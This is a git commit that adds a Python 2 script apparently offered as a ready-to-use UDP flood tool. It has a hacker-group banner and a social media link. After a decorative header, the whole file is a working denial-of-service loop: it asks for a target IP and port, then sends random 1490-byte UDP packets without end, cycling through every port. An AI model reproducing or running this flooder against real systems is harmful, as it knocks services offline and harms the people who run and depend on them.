1bff0b71737a22ec926543e02b80288eb54e5bb6
Вдвїеє <117569698+vakaar78@users.noreply.github.com>
2022-11-10 13:00:13 +0530

    Add files via upload

---
+++ baby.py
@@ -0,0 +1,54 @@
+#!/system/bin/python
+#Fl00d 2.0 27-06-2017 (1:42)
+#Tool for UDP Flood
+#Authorized by DedSecTL
+#AndroSec1337 Cyber Team
+import socket, os, random, time
+
+# Color
+B = '\033[1m'
+R = '\033[31m'
+N = '\033[0m'
+
+# Code time ##################
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+##############################
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+os.system("clear")
+print B+"@@@@@@@@ @@@      @@@@@@@@   @@@@@@@@  @@@@@@@@"
+print "@@@@@@@@ @@@     @@@@@@@@@@ @@@@@@@@@@ @@@   @@@@"
+print "@@!      @@!     @@!   @@@@ @@!   @@@@ @@!     @@@"
+print "!@!      !@!     !@!  @!@!@ !@!  @!@!@ !@!      @!@"
+print "@!!!:!   @!!     @!@ @! !@! @!@ @! !@! @!@      !@!"
+print "!!!!!:   !!!     !@!!!  !!! !@!!!  !!! !@!      !!!"
+print "!!:      !!:     !!:!   !!! !!:!   !!! !!:      !!!"
+print ":!:      :!:     :!:    !:! :!:    !:! :!:     !:!"
+print ":::      ::::::: :::::::::: :::::::::: ;::    :::"
+print ":::      :::::::  ::::::::   ::::::::  :::::::::"+N
+print "["+B+""+R+"#"+N+"] "+B+""+R+"modified by baby_doll"+N+"    2.0 - "+B+""+R+"name SANA KHAN"+N
+print
+print "facebook id :: https://www.facebook.com/daed.body.not.entrested.in"
+print "created who modified by baby_Doll"
+print
+ip = raw_input('[$] T@rget 1P: ')
+port = input('[$] P0rt: ')
+os.system("clear")
+print " attack has been started with baby_doll  {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
+time.sleep(3)
+print
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
